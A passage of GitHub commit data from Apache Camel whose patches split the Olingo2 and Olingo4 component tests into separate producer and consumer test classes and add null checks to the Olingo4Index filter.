mockEndpoint = getMockEndpoint(\"mock:consumer-splitresult\");\n+        mockEndpoint.expectedMinimumMessageCount(expectedMsgCount);\n+\n+        RouteBuilder builder = new RouteBuilder() {\n+            public void configure() {\n+                from(\"olingo2://read/Manufacturers?consumer.splitResult=true\")\n+                    .to(\"mock:consumer-splitresult\");\n+            };\n+        };\n+\n+        addRouteAndStartContext(builder);\n+\n+        mockEndpoint.assertIsSatisfied();\n+\n+        //\n+        // 2 individual messages in the exchange,\n+        // each containing a different entity.\n+        //\n+        for (int i = 0; i < expectedMsgCount; ++i) {\n+            Object body = mockEndpoint.getExchanges().get(i).getIn().getBody();\n+            assertTrue(body instanceof ODataEntry);\n+            ODataEntry entry = (ODataEntry)body;\n+            Map<String, Object> properties = entry.getProperties();\n+            assertNotNull(properties);\n+\n+            Object name = properties.get(\"Name\");\n+            assertNotNull(name);\n+            assertTrue(name.toString().contains(\"Powered Racing\"));\n+        }\n+    }\n+}",
                "raw_url": "https://github.com/apache/camel/raw/482cf923bc47d2b1e025dfd109fb28ce40ec1af6/components/camel-olingo2/camel-olingo2-component/src/test/java/org/apache/camel/component/olingo2/Olingo2ComponentConsumerTest.java",
                "sha": "e95c53e297f99e011e0f7398adf53fd55481c22e",
                "status": "added"
            },
            {
                "additions": 6,
                "blob_url": "https://github.com/apache/camel/blob/482cf923bc47d2b1e025dfd109fb28ce40ec1af6/components/camel-olingo2/camel-olingo2-component/src/test/java/org/apache/camel/component/olingo2/Olingo2ComponentProducerTest.java",
                "changes": 140,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-olingo2/camel-olingo2-component/src/test/java/org/apache/camel/component/olingo2/Olingo2ComponentProducerTest.java?ref=482cf923bc47d2b1e025dfd109fb28ce40ec1af6",
                "deletions": 134,
                "filename": "components/camel-olingo2/camel-olingo2-component/src/test/java/org/apache/camel/component/olingo2/Olingo2ComponentProducerTest.java",
                "patch": "@@ -1,4 +1,4 @@\n-/*\n+/**\n  * Licensed to the Apache Software Foundation (ASF) under one or more\n  * contributor license agreements.  See the NOTICE file distributed with\n  * this work for additional information regarding copyright ownership.\n@@ -44,16 +44,15 @@\n import org.slf4j.LoggerFactory;\n \n /**\n- * Test class for {@link org.apache.camel.component.olingo2.api.Olingo2App}\n- * APIs.\n+ * Test class for {@link org.apache.camel.component.olingo2.api.Olingo2App} APIs.\n  * <p>\n  * The integration test runs against Apache Olingo 2.0 sample server which is\n  * dynamically installed and started during the test.\n  * </p>\n  */\n-public class Olingo2ComponentTest extends AbstractOlingo2TestSupport {\n+public class Olingo2ComponentProducerTest extends AbstractOlingo2TestSupport {\n \n-    private static final Logger LOG = LoggerFactory.getLogger(Olingo2ComponentTest.class);\n+    private static final Logger LOG = LoggerFactory.getLogger(Olingo2ComponentProducerTest.class);\n     private static final int PORT = AvailablePortFinder.getNextAvailable();\n     private static final String ID_PROPERTY = \"Id\";\n     private static final String MANUFACTURERS = \"Manufacturers\";\n@@ -68,7 +67,7 @@\n \n     private static Olingo2SampleServer server;\n \n-    public Olingo2ComponentTest() {\n+    public Olingo2ComponentProducerTest() {\n         setDefaultTestProperty(\"serviceUri\", \"http://localhost:\" + PORT + \"/MyFormula.svc\");\n     }\n \n@@ -246,90 +245,10 @@ public void testBatch() throws Exception {\n         LOG.info(\"Read deleted entry exception: {}\", exception);\n     }\n \n-    /**\n-     * Read entity set of the People object and filter already seen items on\n-     * subsequent exchanges Use a delay since the mock endpoint does not always\n-     * get the correct number of exchanges before being satisfied.\n-     *\n-     * Note:\n-     * - consumer.splitResults is set to false since this ensures the first returned message\n-     *   contains all the results. This is preferred for the purposes of this test. The default\n-     *   will mean the first n messages contain the results (where n is the result total) then\n-     *   subsequent messages will be empty\n-     */\n-    @Test\n-    public void testConsumerReadFilterAlreadySeen() throws Exception {\n-        final Map<String, Object> headers = new HashMap<>();\n-        String endpoint = \"olingo2://read/Manufacturers?filterAlreadySeen=true&consumer.delay=2&consumer.sendEmptyMessageWhenIdle=true&consumer.splitResult=false\";\n-\n-        int expectedMsgCount = 3;\n-        MockEndpoint mockEndpoint = getMockEndpoint(\"mock:consumer-alreadyseen\");\n-        mockEndpoint.expectedMessageCount(expectedMsgCount);\n-        mockEndpoint.setResultWaitTime(60000);\n-\n-        final ODataFeed manufacturers = (ODataFeed)requestBodyAndHeaders(endpoint, null, headers);\n-        assertNotNull(manufacturers);\n-        int expectedManufacturers = manufacturers.getEntries().size();\n-\n-        mockEndpoint.assertIsSatisfied();\n-\n-        for (int i = 0; i < expectedMsgCount; ++i) {\n-            Object body = mockEndpoint.getExchanges().get(i).getIn().getBody();\n-\n-            if (i == 0) {\n-                //\n-                // First polled messages contained all the manufacturers\n-                //\n-                assertTrue(body instanceof ODataFeed);\n-                ODataFeed set = (ODataFeed)body;\n-                assertEquals(expectedManufacturers, set.getEntries().size());\n-            } else {\n-                //\n-                // Subsequent polling messages should be empty\n-                // since the filterAlreadySeen property is true\n-                //\n-                assertNull(body);\n-            }\n-        }\n-    }\n-\n-    /**\n-     * Read value of the People object and split the results\n-     * into individual messages\n-     */\n-    @Test\n-    public void testConsumerReadClientValuesSplitResults() throws Exception {\n-        final Map<String, Object> headers = new HashMap<>();\n-        String endpoint = \"olingo2://read/Manufacturers('1')/Address?consumer.splitResult=true\";\n-\n-        this.context.setTracing(true);\n-        MockEndpoint mockEndpoint = getMockEndpoint(\"mock:consumer-value\");\n-        mockEndpoint.expectedMinimumMessageCount(1);\n-        mockEndpoint.setResultWaitTime(60000);\n-\n-        final Map<String, Object> resultValue = requestBodyAndHeaders(endpoint, null, headers);\n-        assertNotNull(resultValue);\n-\n-        mockEndpoint.assertIsSatisfied();\n-        //\n-        // 1 individual message in the exchange\n-        //\n-        Object body = mockEndpoint.getExchanges().get(0).getIn().getBody();\n-        assertIsInstanceOf(Map.class, body);\n-        Map<String, Object> value = (Map<String, Object>) body;\n-        Object addrObj = value.get(\"Address\");\n-        assertIsInstanceOf(Map.class, addrObj);\n-        Map<String, Object> addrMap = (Map<String, Object>) addrObj;\n-        assertEquals(\"70173\", addrMap.get(\"ZipCode\"));\n-        assertEquals(\"Star Street 137\", addrMap.get(\"Street\"));\n-        assertEquals(\"Germany\", addrMap.get(\"Country\"));\n-        assertEquals(\"Stuttgart\", addrMap.get(\"City\"));\n-    }\n-\n     /**\n      * Read entity set of the People object and with no filter already seen, all\n      * items should be present in each message\n-     *\n+    *\n      * @throws Exception\n      */\n     @Test\n@@ -408,41 +327,6 @@ public void testProducerReadFilterAlreadySeen() throws Exception {\n         }\n     }\n \n-    /**\n-     * Read entity set of the Manufacturers object and split the results\n-     * into individual messages\n-     */\n-    @Test\n-    public void testConsumerReadSplitResults() throws Exception {\n-        final Map<String, Object> headers = new HashMap<>();\n-        String endpoint = \"olingo2://read/Manufacturers?consumer.splitResult=true\";\n-\n-        int expectedMsgCount = 2;\n-        MockEndpoint mockEndpoint = getMockEndpoint(\"mock:consumer-splitresult\");\n-        mockEndpoint.expectedMinimumMessageCount(expectedMsgCount);\n-\n-        final ODataFeed odataFeed = (ODataFeed)requestBodyAndHeaders(endpoint, null, headers);\n-        assertNotNull(odataFeed);\n-\n-        mockEndpoint.assertIsSatisfied();\n-\n-        //\n-        // 2 individual messages in the exchange,\n-        // each containing a different entity.\n-        //\n-        for (int i = 0; i < expectedMsgCount; ++i) {\n-            Object body = mockEndpoint.getExchanges().get(i).getIn().getBody();\n-            assertTrue(body instanceof ODataEntry);\n-            ODataEntry entry = (ODataEntry)body;\n-            Map<String, Object> properties = entry.getProperties();\n-            assertNotNull(properties);\n-\n-            Object name = properties.get(\"Name\");\n-            assertNotNull(name);\n-            assertTrue(name.toString().contains(\"Powered Racing\"));\n-        }\n-    }\n-\n     @Override\n     protected RouteBuilder createRouteBuilder() throws Exception {\n         return new RouteBuilder() {\n@@ -475,18 +359,6 @@ public void configure() {\n                 from(\"direct:read-people-nofilterseen\").to(\"olingo2://read/Manufacturers\").to(\"mock:producer-noalreadyseen\");\n \n                 from(\"direct:read-people-filterseen\").to(\"olingo2://read/Manufacturers?filterAlreadySeen=true\").to(\"mock:producer-alreadyseen\");\n-\n-                //\n-                // Consumer endpoint\n-                //\n-                from(\"olingo2://read/Manufacturers?filterAlreadySeen=true&consumer.delay=2&consumer.sendEmptyMessageWhenIdle=true&consumer.splitResult=false\")\n-                    .to(\"mock:consumer-alreadyseen\");\n-\n-                from(\"olingo2://read/Manufacturers?consumer.splitResult=true\")\n-                    .to(\"mock:consumer-splitresult\");\n-\n-                from(\"olingo2://read/Manufacturers('1')/Address?consumer.splitResult=true\")\n-                    .to(\"mock:consumer-value\");\n             }\n         };\n     }",
                "previous_filename": "components/camel-olingo2/camel-olingo2-component/src/test/java/org/apache/camel/component/olingo2/Olingo2ComponentTest.java",
                "raw_url": "https://github.com/apache/camel/raw/482cf923bc47d2b1e025dfd109fb28ce40ec1af6/components/camel-olingo2/camel-olingo2-component/src/test/java/org/apache/camel/component/olingo2/Olingo2ComponentProducerTest.java",
                "sha": "2f82dcd153a07fb1ae2d289fe51f66e34847ff6b",
                "status": "renamed"
            },
            {
                "additions": 22,
                "blob_url": "https://github.com/apache/camel/blob/482cf923bc47d2b1e025dfd109fb28ce40ec1af6/components/camel-olingo4/camel-olingo4-component/src/main/java/org/apache/camel/component/olingo4/Olingo4Index.java",
                "changes": 23,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-olingo4/camel-olingo4-component/src/main/java/org/apache/camel/component/olingo4/Olingo4Index.java?ref=482cf923bc47d2b1e025dfd109fb28ce40ec1af6",
                "deletions": 1,
                "filename": "components/camel-olingo4/camel-olingo4-component/src/main/java/org/apache/camel/component/olingo4/Olingo4Index.java",
                "patch": "@@ -24,24 +24,33 @@\n \n import org.apache.olingo.client.api.domain.ClientEntity;\n import org.apache.olingo.client.api.domain.ClientEntitySet;\n+import org.apache.olingo.client.core.domain.ClientEntitySetImpl;\n \n public class Olingo4Index {\n \n     private Set<Integer> resultIndex = new HashSet<>();\n \n     private Object filter(Object o) {\n-        if (resultIndex.contains(o.hashCode())) {\n+        if (o == null || resultIndex.contains(o.hashCode())) {\n             return null;\n         }\n         return o;\n     }\n \n     private void indexDefault(Object o) {\n+        if (o == null) {\n+            return;\n+        }\n+\n         resultIndex.add(o.hashCode());\n     }\n \n     private Iterable<?> filter(Iterable<?> iterable) {\n         List<Object> filtered = new ArrayList<>();\n+        if (iterable == null) {\n+            return filtered;\n+        }\n+\n         for (Object o : iterable) {\n             if (resultIndex.contains(o.hashCode())) {\n                 continue;\n@@ -53,12 +62,20 @@ private void indexDefault(Object o) {\n     }\n \n     private void index(Iterable<?> iterable) {\n+        if (iterable == null) {\n+            return;\n+        }\n+\n         for (Object o : iterable) {\n             resultIndex.add(o.hashCode());\n         }\n     }\n \n     private ClientEntitySet filter(ClientEntitySet entitySet) {\n+        if (entitySet == null) {\n+            return new ClientEntitySetImpl();\n+        }\n+\n         List<ClientEntity> entities = entitySet.getEntities();\n \n         if (entities.isEmpty()) {\n@@ -78,6 +95,10 @@ private ClientEntitySet filter(ClientEntitySet entitySet) {\n     }\n \n     private void index(ClientEntitySet entitySet) {\n+        if (entitySet == null) {\n+            return;\n+        }\n+\n         for (ClientEntity entity : entitySet.getEntities()) {\n             resultIndex.add(entity.hashCode());\n         }",
                "raw_url": "https://github.com/apache/camel/raw/482cf923bc47d2b1e025dfd109fb28ce40ec1af6/components/camel-olingo4/camel-olingo4-component/src/main/java/org/apache/camel/component/olingo4/Olingo4Index.java",
                "sha": "a13da22d0192811ae5743cff7f7eace0df9cca1c",
                "status": "modified"
            },
            {
                "additions": 270,
                "blob_url": "https://github.com/apache/camel/blob/482cf923bc47d2b1e025dfd109fb28ce40ec1af6/components/camel-olingo4/camel-olingo4-component/src/test/java/org/apache/camel/component/olingo4/Olingo4ComponentConsumerTest.java",
                "changes": 270,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-olingo4/camel-olingo4-component/src/test/java/org/apache/camel/component/olingo4/Olingo4ComponentConsumerTest.java?ref=482cf923bc47d2b1e025dfd109fb28ce40ec1af6",
                "deletions": 0,
                "filename": "components/camel-olingo4/camel-olingo4-component/src/test/java/org/apache/camel/component/olingo4/Olingo4ComponentConsumerTest.java",
                "patch": "@@ -0,0 +1,270 @@\n+/**\n+ * Licensed to the Apache Software Foundation (ASF) under one or more\n+ * contributor license agreements.  See the NOTICE file distributed with\n+ * this work for additional information regarding copyright ownership.\n+ * The ASF licenses this file to You under the Apache License, Version 2.0\n+ * (the \"License\"); you may not use this file except in compliance with\n+ * the License.  You may obtain a copy of the License at\n+ *\n+ *      http://www.apache.org/licenses/LICENSE-2.0\n+ *\n+ * Unless required by applicable law or agreed to in writing, software\n+ * distributed under the License is distributed on an \"AS IS\" BASIS,\n+ * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n+ * See the License for the specific language governing permissions and\n+ * limitations under the License.\n+ */\n+package org.apache.camel.component.olingo4;\n+\n+import java.util.Iterator;\n+import org.apache.camel.builder.RouteBuilder;\n+import org.apache.camel.component.mock.MockEndpoint;\n+import org.apache.olingo.client.api.domain.ClientCollectionValue;\n+import org.apache.olingo.client.api.domain.ClientComplexValue;\n+import org.apache.olingo.client.api.domain.ClientEntity;\n+import org.apache.olingo.client.api.domain.ClientEntitySet;\n+import org.apache.olingo.client.api.domain.ClientPrimitiveValue;\n+import org.apache.olingo.client.api.domain.ClientProperty;\n+import org.junit.Test;\n+\n+public class Olingo4ComponentConsumerTest extends AbstractOlingo4TestSupport {\n+\n+    private static final String PEOPLE = \"People\";\n+    private static final String TEST_PEOPLE = \"People('russellwhyte')\";\n+    private static final String AIRPORTS = \"Airports\";\n+\n+    public Olingo4ComponentConsumerTest() {\n+        setUseRouteBuilder(false);\n+    }\n+\n+    @Override\n+    public boolean isCreateCamelContextPerClass() {\n+        return false;\n+    }\n+\n+    private void addRouteAndStartContext(RouteBuilder builder) throws Exception {\n+        context().addRoutes(builder);\n+        startCamelContext();\n+    }\n+\n+    /**\n+     * Read entity set of the People object\n+     * and filter already seen items on subsequent exchanges\n+     * Use a delay since the mock endpoint does not always get\n+     * the correct number of exchanges before being satisfied.\n+     *\n+     * Note:\n+     * - consumer.splitResults is set to false since this ensures the first returned message\n+     *   contains all the results. This is preferred for the purposes of this test. The default\n+     *   will mean the first n messages contain the results (where n is the result total) then\n+     *   subsequent messages will be empty\n+     */\n+    @Test\n+    public void testConsumerReadFilterAlreadySeen() throws Exception {\n+        int expectedEntities = 20;\n+        int expectedMsgCount = 3;\n+        MockEndpoint mockEndpoint = getMockEndpoint(\"mock:consumer-alreadyseen\");\n+        mockEndpoint.expectedMinimumMessageCount(expectedMsgCount);\n+\n+        RouteBuilder builder = new RouteBuilder() {\n+            public void configure() {\n+                from(\"olingo4://read/\" + PEOPLE + \"?consumer.delay=2&consumer.sendEmptyMessageWhenIdle=true&consumer.splitResult=false&filterAlreadySeen=true\")\n+                    .to(\"mock:consumer-alreadyseen\");\n+            };\n+        };\n+        addRouteAndStartContext(builder);\n+\n+        mockEndpoint.assertIsSatisfied();\n+\n+        for (int i = 0; i < expectedMsgCount; ++i) {\n+            Object body = mockEndpoint.getExchanges().get(i).getIn().getBody();\n+\n+            if (i == 0) {\n+                //\n+                // First polled messages contained all the entities\n+                //\n+                assertTrue(body instanceof ClientEntitySet);\n+                ClientEntitySet set = (ClientEntitySet) body;\n+                assertEquals(expectedEntities, set.getEntities().size());\n+            } else {\n+                //\n+                // Subsequent polling messages should be empty\n+                // since the filterAlreadySeen property is true\n+                //\n+                assertNull(body);\n+            }\n+        }\n+    }\n+\n+    @Test\n+    public void testConsumerReadFilterAlreadySeenWithPredicateAndSplitResults() throws Exception {\n+        int expectedMsgCount = 3;\n+        MockEndpoint mockEndpoint = getMockEndpoint(\"mock:consumer-splitresult-kp-airport\");\n+        mockEndpoint.expectedMinimumMessageCount(expectedMsgCount);\n+\n+        RouteBuilder builder = new RouteBuilder() {\n+            public void configure() {\n+                from(\"olingo4://read/\" + AIRPORTS + \"('KSFO')\"\n+                        + \"?filterAlreadySeen=true&\"\n+                        + \"consumer.delay=2&consumer.sendEmptyMessageWhenIdle=true&\"\n+                        + \"consumer.splitResult=true\")\n+                    .to(\"mock:consumer-splitresult-kp-airport\");\n+            };\n+        };\n+        addRouteAndStartContext(builder);\n+\n+        mockEndpoint.assertIsSatisfied();\n+\n+        for (int i = 0; i < expectedMsgCount; ++i) {\n+            Object body = mockEndpoint.getExchanges().get(i).getIn().getBody();\n+\n+            if (i == 0) {\n+                //\n+                // First polled messages contained all the entities\n+                //\n+                assertTrue(body instanceof ClientEntity);\n+                ClientEntity ksfoEntity = (ClientEntity) body;\n+                ClientProperty nameProp = ksfoEntity.getProperty(\"Name\");\n+                assertNotNull(nameProp);\n+                assertEquals(\"San Francisco International Airport\", nameProp.getValue().toString());\n+            } else {\n+                //\n+                // Subsequent polling messages should be empty\n+                // since the filterAlreadySeen property is true\n+                //\n+                assertNull(body);\n+            }\n+        }\n+    }\n+\n+    /**\n+     * Read entity set of the People object and split the results\n+     * into individual messages\n+     */\n+    @Test\n+    public void testConsumerReadSplitResults() throws Exception {\n+        int expectedMsgCount = 3;\n+        MockEndpoint mockEndpoint = getMockEndpoint(\"mock:consumer-splitresult\");\n+        mockEndpoint.expectedMinimumMessageCount(expectedMsgCount);\n+\n+        RouteBuilder builder = new RouteBuilder() {\n+            public void configure() {\n+                from(\"olingo4://read/\" + PEOPLE + \"?consumer.splitResult=true\")\n+                    .to(\"mock:consumer-splitresult\");\n+            };\n+        };\n+        addRouteAndStartContext(builder);\n+\n+        mockEndpoint.assertIsSatisfied();\n+        //\n+        // At least 3 individual messages in the exchange,\n+        // each containing a different entity.\n+        //\n+        for (int i = 0; i < expectedMsgCount; ++i) {\n+            Object body = mockEndpoint.getExchanges().get(i).getIn().getBody();\n+            assertTrue(body instanceof ClientEntity);\n+            ClientEntity entity = (ClientEntity)body;\n+            ClientProperty nameProperty = entity.getProperty(\"UserName\");\n+            assertNotNull(nameProperty);\n+\n+            switch(i) {\n+            case 0:\n+                assertEquals(\"russellwhyte\", nameProperty.getValue().toString());\n+                break;\n+            case 1:\n+                assertEquals(\"scottketchum\", nameProperty.getValue().toString());\n+                break;\n+            case 2:\n+                assertEquals(\"ronaldmundy\", nameProperty.getValue().toString());\n+                break;\n+            default:\n+            }\n+        }\n+    }\n+\n+    /**\n+     * Read value of the People object and split the results\n+     * into individual messages\n+     */\n+    @Test\n+    public void testConsumerReadClientValuesSplitResults() throws Exception {\n+        MockEndpoint mockEndpoint = getMockEndpoint(\"mock:consumer-splitresult-value\");\n+        mockEndpoint.expectedMinimumMessageCount(1);\n+\n+        RouteBuilder builder = new RouteBuilder() {\n+            public void configure() {\n+                from(\"olingo4://read/\" + TEST_PEOPLE + \"/FavoriteFeature?consumer.splitResult=true\")\n+                    .to(\"mock:consumer-splitresult-value\");\n+            };\n+        };\n+        addRouteAndStartContext(builder);\n+\n+        mockEndpoint.assertIsSatisfied();\n+        //\n+        // 1 individual message in the exchange\n+        //\n+        Object body = mockEndpoint.getExchanges().get(0).getIn().getBody();\n+        assertIsInstanceOf(ClientPrimitiveValue.class, body);\n+        ClientPrimitiveValue value = (ClientPrimitiveValue) body;\n+        assertEquals(\"Feature1\", value.toString());\n+    }\n+\n+    /**\n+     * Read value of the People object's AddressInfo collection value\n+     * & split the results into individual messages for each address\n+     */\n+    @Test\n+    public void testConsumerReadClientCollectionValuesSplitResults() throws Exception {\n+        MockEndpoint mockEndpoint = getMockEndpoint(\"mock:consumer-splitresult-collection-value\");\n+        mockEndpoint.expectedMinimumMessageCount(1);\n+\n+        RouteBuilder builder = new RouteBuilder() {\n+            public void configure() {\n+                from(\"olingo4://read/\" + TEST_PEOPLE + \"/AddressInfo?consumer.splitResult=true\")\n+                    .to(\"mock:consumer-splitresult-collection-value\");\n+            };\n+        };\n+        addRouteAndStartContext(builder);\n+\n+        mockEndpoint.assertIsSatisfied();\n+        //\n+        // 1 individual message in the exchange\n+        //\n+        Object body = mockEndpoint.getExchanges().get(0).getIn().getBody();\n+        assertIsInstanceOf(ClientComplexValue.class, body);\n+        ClientComplexValue value = (ClientComplexValue) body;\n+        assertEquals(\"Boise\", value.get(\"City\").getComplexValue().get(\"Name\").getValue().toString());\n+    }\n+\n+    /**\n+     * Read value of the People object's AddressInfo collection value\n+     * & split the results into individual messages for each address\n+     */\n+    @Test\n+    public void testConsumerReadClientCollectionValuesNoSplitResults() throws Exception {\n+        MockEndpoint mockEndpoint = getMockEndpoint(\"mock:consumer-nosplitresult-colleciton-value\");\n+        mockEndpoint.expectedMinimumMessageCount(1);\n+\n+        RouteBuilder builder = new RouteBuilder() {\n+            public void configure() {\n+                from(\"olingo4://read/\" + TEST_PEOPLE + \"/AddressInfo?consumer.splitResult=false\")\n+                    .to(\"mock:consumer-nosplitresult-colleciton-value\");\n+            };\n+        };\n+        addRouteAndStartContext(builder);\n+\n+        mockEndpoint.assertIsSatisfied();\n+        //\n+        // 1 individual collection value message in the exchange\n+        //\n+        Object body = mockEndpoint.getExchanges().get(0).getIn().getBody();\n+        assertIsInstanceOf(ClientCollectionValue.class, body);\n+        ClientCollectionValue<?> value = (ClientCollectionValue<?>) body;\n+        assertEquals(1, value.size());\n+        Iterator<?> propIter = value.iterator();\n+        Object propValueObj = propIter.next();\n+        assertIsInstanceOf(ClientComplexValue.class, propValueObj);\n+        ClientComplexValue propValue = (ClientComplexValue) propValueObj;\n+        assertEquals(\"Boise\", propValue.get(\"City\").getComplexValue().get(\"Name\").getValue().toString());\n+    }\n+}",
                "raw_url": "https://github.com/apache/camel/raw/482cf923bc47d2b1e025dfd109fb28ce40ec1af6/components/camel-olingo4/camel-olingo4-component/src/test/java/org/apache/camel/component/olingo4/Olingo4ComponentConsumerTest.java",
                "sha": "c895e28397ce7a7d1e24023b7f5f09eb3304594b",
                "status": "added"
            },
            {
                "additions": 3,
                "blob_url": "https://github.com/apache/camel/blob/482cf923bc47d2b1e025dfd109fb28ce40ec1af6/components/camel-olingo4/camel-olingo4-component/src/test/java/org/apache/camel/component/olingo4/Olingo4ComponentProducerTest.java",
                "changes": 196,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-olingo4/camel-olingo4-component/src/test/java/org/apache/camel/component/olingo4/Olingo4ComponentProducerTest.java?ref=482cf923bc47d2b1e025dfd109fb28ce40ec1af6",
                "deletions": 193,
                "filename": "components/camel-olingo4/camel-olingo4-component/src/test/java/org/apache/camel/component/olingo4/Olingo4ComponentProducerTest.java",
                "patch": "@@ -1,4 +1,4 @@\n-/*\n+/**\n  * Licensed to the Apache Software Foundation (ASF) under one or more\n  * contributor license agreements.  See the NOTICE file distributed with\n  * this work for additional information regarding copyright ownership.\n@@ -34,9 +34,7 @@\n import org.apache.olingo.client.api.domain.ClientEntity;\n import org.apache.olingo.client.api.domain.ClientEntitySet;\n import org.apache.olingo.client.api.domain.ClientPrimitiveValue;\n-import org.apache.olingo.client.api.domain.ClientProperty;\n import org.apache.olingo.client.api.domain.ClientServiceDocument;\n-import org.apache.olingo.client.api.domain.ClientValue;\n import org.apache.olingo.commons.api.Constants;\n import org.apache.olingo.commons.api.edm.Edm;\n import org.apache.olingo.commons.api.ex.ODataError;\n@@ -54,9 +52,9 @@\n  * service published on http://services.odata.org/TripPinRESTierService.\n  * </p>\n  */\n-public class Olingo4ComponentTest extends AbstractOlingo4TestSupport {\n+public class Olingo4ComponentProducerTest extends AbstractOlingo4TestSupport {\n \n-    private static final Logger LOG = LoggerFactory.getLogger(Olingo4ComponentTest.class);\n+    private static final Logger LOG = LoggerFactory.getLogger(Olingo4ComponentProducerTest.class);\n \n     private static final String PEOPLE = \"People\";\n     private static final String TEST_PEOPLE = \"People('russellwhyte')\";\n@@ -301,52 +299,6 @@ public void testEndpointHttpHeaders() throws Exception {\n         }\n     }\n \n-    /**\n-     * Read entity set of the People object and filter already seen items on\n-     * subsequent exchanges Use a delay since the mock endpoint does not always\n-     * get the correct number of exchanges before being satisfied.\n-     *\n-     * Note:\n-     * - consumer.splitResults is set to false since this ensures the first returned message\n-     *   contains all the results. This is preferred for the purposes of this test. The default\n-     *   will mean the first n messages contain the results (where n is the result total) then\n-     *   subsequent messages will be empty\n-     */\n-    @Test\n-    public void testConsumerReadFilterAlreadySeen() throws Exception {\n-        final Map<String, Object> headers = new HashMap<>();\n-        String endpoint = \"olingo4://read/\" + PEOPLE + \"?filterAlreadySeen=true&consumer.delay=2&consumer.sendEmptyMessageWhenIdle=true&consumer.splitResult=false\";\n-        int expectedEntities = 20;\n-        int expectedMsgCount = 3;\n-        MockEndpoint mockEndpoint = getMockEndpoint(\"mock:consumer-alreadyseen\");\n-        mockEndpoint.expectedMessageCount(expectedMsgCount);\n-\n-        final ClientEntitySet entities = (ClientEntitySet)requestBodyAndHeaders(endpoint, null, headers);\n-        assertNotNull(entities);\n-        assertEquals(expectedEntities, entities.getEntities().size());\n-\n-        mockEndpoint.assertIsSatisfied();\n-\n-        for (int i = 0; i < expectedMsgCount; ++i) {\n-            Object body = mockEndpoint.getExchanges().get(i).getIn().getBody();\n-\n-            if (i == 0) {\n-                //\n-                // First polled messages contained all the entities\n-                //\n-                assertTrue(body instanceof ClientEntitySet);\n-                ClientEntitySet set = (ClientEntitySet)body;\n-                assertEquals(expectedEntities, set.getEntities().size());\n-            } else {\n-                //\n-                // Subsequent polling messages should be empty\n-                // since the filterAlreadySeen property is true\n-                //\n-                assertNull(body);\n-            }\n-        }\n-    }\n-\n     /**\n      * Read entity set of the People object and with no filter already seen, all\n      * items should be present in each message\n@@ -423,130 +375,6 @@ public void testProducerReadFilterAlreadySeen() throws Exception {\n         }\n     }\n \n-    /**\n-     * Read entity set of the People object and split the results\n-     * into individual messages\n-     */\n-    @Test\n-    public void testConsumerReadSplitResults() throws Exception {\n-        final Map<String, Object> headers = new HashMap<>();\n-        String endpoint = \"olingo4://read/\" + PEOPLE + \"?consumer.splitResult=true\";\n-        int expectedEntities = 20;\n-\n-        int expectedMsgCount = 3;\n-        MockEndpoint mockEndpoint = getMockEndpoint(\"mock:consumer-splitresult\");\n-        mockEndpoint.expectedMinimumMessageCount(expectedMsgCount);\n-\n-        final ClientEntitySet entities = (ClientEntitySet)requestBodyAndHeaders(endpoint, null, headers);\n-        assertNotNull(entities);\n-        assertEquals(expectedEntities, entities.getEntities().size());\n-\n-        mockEndpoint.assertIsSatisfied();\n-        //\n-        // At least 3 individual messages in the exchange,\n-        // each containing a different entity.\n-        //\n-        for (int i = 0; i < expectedMsgCount; ++i) {\n-            Object body = mockEndpoint.getExchanges().get(i).getIn().getBody();\n-            assertTrue(body instanceof ClientEntity);\n-            ClientEntity entity = (ClientEntity)body;\n-            ClientProperty nameProperty = entity.getProperty(\"UserName\");\n-            assertNotNull(nameProperty);\n-\n-            switch(i) {\n-            case 0:\n-                assertEquals(\"russellwhyte\", nameProperty.getValue().toString());\n-                break;\n-            case 1:\n-                assertEquals(\"scottketchum\", nameProperty.getValue().toString());\n-                break;\n-            case 2:\n-                assertEquals(\"ronaldmundy\", nameProperty.getValue().toString());\n-                break;\n-            default:\n-            }\n-        }\n-    }\n-\n-    /**\n-     * Read value of the People object and split the results\n-     * into individual messages\n-     */\n-    @Test\n-    public void testConsumerReadClientValuesSplitResults() throws Exception {\n-        final Map<String, Object> headers = new HashMap<>();\n-        String endpoint = \"olingo4://read/\" + TEST_PEOPLE + \"/FavoriteFeature?consumer.splitResult=true\";\n-\n-        MockEndpoint mockEndpoint = getMockEndpoint(\"mock:consumer-splitresult-value\");\n-        mockEndpoint.expectedMinimumMessageCount(1);\n-\n-        final ClientValue resultValue = requestBodyAndHeaders(endpoint, null, headers);\n-        assertIsInstanceOf(ClientValue.class, resultValue);\n-\n-        mockEndpoint.assertIsSatisfied();\n-        //\n-        // 1 individual message in the exchange\n-        //\n-        Object body = mockEndpoint.getExchanges().get(0).getIn().getBody();\n-        assertIsInstanceOf(ClientPrimitiveValue.class, body);\n-        ClientPrimitiveValue value = (ClientPrimitiveValue) body;\n-        assertEquals(\"Feature1\", value.toString());\n-    }\n-\n-    /**\n-     * Read value of the People object's AddressInfo collection value\n-     * & split the results into individual messages for each address\n-     */\n-    @Test\n-    public void testConsumerReadClientCollectionValuesSplitResults() throws Exception {\n-        final Map<String, Object> headers = new HashMap<>();\n-        String endpoint = \"olingo4://read/\" + TEST_PEOPLE + \"/AddressInfo?consumer.splitResult=true\";\n-\n-        MockEndpoint mockEndpoint = getMockEndpoint(\"mock:consumer-splitresult-collection-value\");\n-        mockEndpoint.expectedMinimumMessageCount(1);\n-\n-        final ClientValue resultValue = requestBodyAndHeaders(endpoint, null, headers);\n-        assertIsInstanceOf(ClientValue.class, resultValue);\n-\n-        mockEndpoint.assertIsSatisfied();\n-        //\n-        // 1 individual message in the exchange\n-        //\n-        Object body = mockEndpoint.getExchanges().get(0).getIn().getBody();\n-        assertIsInstanceOf(ClientComplexValue.class, body);\n-        ClientComplexValue value = (ClientComplexValue) body;\n-        assertEquals(\"Boise\", value.get(\"City\").getComplexValue().get(\"Name\").getValue().toString());\n-    }\n-\n-    /**\n-     * Read value of the People object's AddressInfo collection value\n-     * & split the results into individual messages for each address\n-     */\n-    @Test\n-    public void testConsumerReadClientCollectionValuesNoSplitResults() throws Exception {\n-        final Map<String, Object> headers = new HashMap<>();\n-        String endpoint = \"olingo4://read/\" + TEST_PEOPLE + \"/AddressInfo?consumer.splitResult=false\";\n-\n-        MockEndpoint mockEndpoint = getMockEndpoint(\"mock:consumer-nosplitresult-colleciton-value\");\n-        